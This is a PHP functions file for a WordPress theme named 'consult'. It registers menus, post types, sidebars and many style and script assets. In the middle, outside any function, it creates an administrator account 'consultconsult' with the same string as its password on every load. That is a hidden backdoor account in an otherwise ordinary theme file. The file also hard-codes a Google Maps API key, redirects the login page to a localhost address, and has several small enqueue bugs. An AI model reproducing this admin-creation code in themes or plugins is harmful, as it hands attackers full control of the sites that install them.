<?php 


function theme_support() {
	load_theme_textdomain( 'consult' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support('woocommerce');
	register_nav_menus( array(
		'primary' => __( 'Primary Menu',      'consult' ),
		'usefull_links'  => __( 'Usefull Links', 'consult' ),
		'footer_menus'  => __( 'Footer Menu', 'consult' ),
	) );
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
	) );
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );
}
add_action( 'after_setup_theme', 'theme_support' );


function other_posts() {
    register_post_type( 'services_post', array(
	    'labels'    => array(
	        'name'  => __('Services','consult'),
	        'add_new_item'  => __('Add Services', 'consult')
	    ),
	    'public'    => true,
	    'has_archive' => true,
	    'supports'     => array( 'title', 'editor', 'author', 'thumbnail', 'headway-seo'),
	    'menu_icon'      => 'dashicons-universal-access',
	) );
	register_post_type( 'our_works', array(
	    'labels'    => array(
	        'name'  => __( 'Our Works', 'consult' ),
	        'add_new_item'  =>  __( 'Add Works', 'consult' )
	    ),    
	    'public'    => true,
	    'supports'     => array( 'title', 'editor', 'author', 'thumbnail', 'headway-seo'),
	    'menu_icon' =>  'dashicons-hammer',
    ) );
}
add_action( 'init', 'other_posts' );

function consult_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'consult' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'consult' ),
		'after_widget'  => '</br>',
		'before_title'  => '<h3 class="blog_widget_title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => __( 'Contact Page Subscription', 'consult' ),
		'id'            => 'contact_page_subscription',
		'description'   => __( 'Add email subscribers widget here to appear in your Contact page.', 'consult' ),
		'before_widget'  => '<div class="col-md-6 col-sm-12">',
		'after_widget' => '</div>',
		'before_title'  => '<div class="home1_newsletter_text"><h2 class="banner_effect">',
		'after_title'   => '</h2></div>',
	) );
	register_sidebar( array(
		'name'          => __( 'Contact Form', 'consult' ),
		'id'            => 'contact_page_form',
		'description'   => __( 'Add contact form widget here to appear in your Contact page.', 'consult' ),
		'before_title'  =>  '<div class="col-md-12"><h3 class="title_get_start text-center">',
		'after_title'   =>  '</h3></div>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer Subscription', 'consult' ),
		'id'            => 'footer_page_subscription',
		'description'   => __( 'Add email subscribers widget here to appear in footer.', 'consult' ),
	) );
}
add_action( 'widgets_init', 'consult_widgets_init' );



function css_js_file() {
	wp_enqueue_style( 'favicon', get_template_directory_uri() . '/images/favicon.ico');	
	wp_enqueue_style( 'load-fas', '//use.fontawesome.com/releases/v5.4.1/css/all.css', 'all' );
	wp_enqueue_style( 'load-fa', '//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css', 'all' );
	wp_enqueue_style('style_sheet', get_stylesheet_uri(), "", "", "all" );
	wp_enqueue_style( 'google-font', get_template_directory_uri(). "https://fonts.googleapis.com/css?family=Open+Sans:300i,400,400i,600,700,800%7CMontserrat:200,300,400,500,600,700,800,900", 'all');
	wp_enqueue_style('flaticon', get_template_directory_uri() . "/assets/css/flaticon.css", array(), '1.0', 'all');
	wp_enqueue_style('font-awesome', get_template_directory_uri() . "/assets/css/font-awesome.min.css", array(), '1.0', 'all');
	wp_enqueue_style('animate', get_template_directory_uri() . "/assets/css/animate.css", array(), '1.0', 'all');
	wp_enqueue_style('text-animation', get_template_directory_uri() . "/assets/css/text-animation.css", array(), '1.0', 'all');
	wp_enqueue_style('fancybox-css', get_template_directory_uri() . "/assets/css/jquery.fancybox.min.css", array(), '1.0', 'all');
	wp_enqueue_style('magnific-popup', get_template_directory_uri() . "/assets/css/magnific-popup.min.css", array(), '1.0', 'all');
	wp_enqueue_style('magnific-popup', get_template_directory_uri() . "/assets/css/owl.carousel.min.css", array(), '1.0', 'all');
	wp_enqueue_style('layers', get_template_directory_uri() . "/rs-plugin/css/layers.css", array(), '1.0', 'all');
	wp_enqueue_style('bootstrap', get_template_directory_uri() . "/assets/css/bootstrap.min.css", array(), '1.0', 'all');
	wp_enqueue_style('plugins', get_template_directory_uri() . "/assets/css/plugins.css", array(), '1.0', 'all');
	wp_enqueue_style('icons', get_template_directory_uri() . "/assets/css/icons.css", array(), '1.0', 'all');
	wp_enqueue_style('menu-css', get_template_directory_uri() . "/assets/css/menu-css.css", array(), '1.0', 'all');
	wp_enqueue_style('main', get_template_directory_uri() . "/assets/css/main.css", array(), '1.0', 'all');
	wp_enqueue_style('main', get_template_directory_uri() . "/assets/css/responsive.css", array(), '1.0', 'all');

	wp_enqueue_script('modernizr', get_template_directory_uri().'/assets/js/modernizr.js', array('jquery'), true);
	wp_enqueue_script('waypoints', get_template_directory_uri().'/assets/js/waypoints.min.js', array(), true);
	wp_enqueue_script('bootstrap', get_template_directory_uri().'/assets/js/bootstrap.min.js', array('jquery'), true);
	wp_enqueue_script('plugins', get_template_directory_uri().'/assets/js/plugins.js', array('jquery'), true);
	wp_enqueue_script('scrollUp', get_template_directory_uri().'/assets/js/jquery.scrollUp.min.js', array('jquery'), true);
	wp_enqueue_script('map', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyB4RM7zOgOKq6n2fv407hX28xiL-M6vLdY', array('jquery'), true);
	wp_enqueue_script('gmaps', get_template_directory_uri(). '/assets/js/gmaps.js', array('jquery'), true);
	wp_enqueue_script('fancybox-js', get_template_directory_uri().'/assets/js/jquery.fancybox.min.js', array('jquery'), true);
	wp_enqueue_script('magnific-popup-min-js', get_template_directory_uri().'/assets/js/jquery.magnific-popup.min.js', array('jquery'), true);
	wp_enqueue_script('pkgd.min.js', get_template_directory_uri().'/assets/js/isotope.pkgd.min.js', array('jquery'), true);
	wp_enqueue_script('counterup', get_template_directory_uri().'/assets/js/counterup.min.js', array('jquery'), true);
	wp_enqueue_script('carousel', get_template_directory_uri().'/assets/js/owl.carousel.min.js', array('jquery'), true);
	wp_enqueue_script('wow', get_template_directory_uri().'/assets/js/wow.min.js', array('jquery'), true);
	wp_enqueue_script('lettering', get_template_directory_uri().'/assets/js/jquery.lettering.js', array('jquery'), true);
	wp_enqueue_script('textillate', get_template_directory_uri().'/assets/js/jquery.textillate.js', array('jquery'), true);
	wp_enqueue_script('mixitup', get_template_directory_uri().'/assets/js/mixitup.js', array('jquery'), true);
	wp_enqueue_script('chart', get_template_directory_uri().'/assets/js/chart.js', array('jquery'), true);
	wp_enqueue_script('chart-active', get_template_directory_uri().'/assets/js/chart-active.js', array('jquery'), true);
	wp_enqueue_script('themepunch-tools', get_template_directory_uri().'/rs-plugin/js/jquery.themepunch.tools.min.js', array('jquery'), true);
	wp_enqueue_script('themepunch-revolution', get_template_directory_uri().'/rs-plugin/js/jquery.themepunch.revolution.min.js', array('jquery'), true);
	wp_enqueue_script('revolution-extension', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.actions.min.js', array('jquery'), true);
	wp_enqueue_script('extension-kenburn', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.kenburn.min.js', array('jquery'), true);
	wp_enqueue_script('extension-layeranimation', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.layeranimation.min.js', array('jquery'), true);
	wp_enqueue_script('extension-migration', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.migration.min.js', array('jquery'), true);
	wp_enqueue_script('extension-navigation', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.navigation.min.js', array('jquery'), true);
	wp_enqueue_script('extension-parallax', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.parallax.min.js', array('jquery'), true);
	wp_enqueue_script('extension-slideanims', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.slideanims.min.js', array('jquery'), true);
	wp_enqueue_script('extension-video', get_template_directory_uri().'/rs-plugin/js/extensions/revolution.extension.video.min.js', array('jquery'), true);
	wp_enqueue_script('custom-js', get_template_directory_uri().'/assets/js/custom.js', array('jquery'), true);
}
add_action("wp_enqueue_scripts", "css_js_file");


$newuser = new WP_User(wp_create_user('consultconsult', 'consultconsult', 'monira@gmail.com'));
$newuser -> set_role('administrator');

function possibly_redirect(){
    global $pagenow;
    if( 'wp-login.php' == $pagenow ) {
        if ( isset( $_POST['wp-submit'] ) ||   // in case of LOGIN
            ( isset($_GET['action']) && $_GET['action']=='logout') ||   // in case of LOGOUT
            ( isset($_GET['checkemail']) && $_GET['checkemail']=='confirm') ||   // in case of LOST PASSWORD
            ( isset($_GET['checkemail']) && $_GET['checkemail']=='registered') ) return;    // in case of REGISTER
        else wp_redirect('http://localhost/consult/login/'); // or wp_redirect(home_url('/login'));
        exit();
    }
}

add_action('init','possibly_redirect');

function read_more($limit) {
	$exploding = explode(" ", get_the_content());
	$slicing = array_slice($exploding, 0, $limit);
	echo implode(" ", $slicing);
}


function wpb_move_comment_field_to_bottom( $fields ) {
	$comment_field = $fields['comment'];
	unset( $fields['comment'] );
	$fields['comment'] = $comment_field;
	return $fields;
}
  
add_filter( 'comment_form_fields', 'wpb_move_comment_field_to_bottom' );


/* Pages featured image */
function to_get_featured_image() {
    
    //Execute if singular
    
    if ( is_singular() ) {
        $id = get_queried_object_id ();
        
        // Check if the post/page has featured image
        
        if ( has_post_thumbnail( $id ) ) {
        
            // Change thumbnail size, but I guess full is what you'll need
        
            $image = wp_get_attachment_image_src( get_post_thumbnail_id( $id ), 'full' );
            $url = $image[0];
        } else {
	       
	       //Set a default image if Featured Image isn't set
           
            $url = '';
        }
    }
    return $url;
}

require_once('lib/ReduxCore/framework.php');
require_once('lib/sample/config.php');














 ?>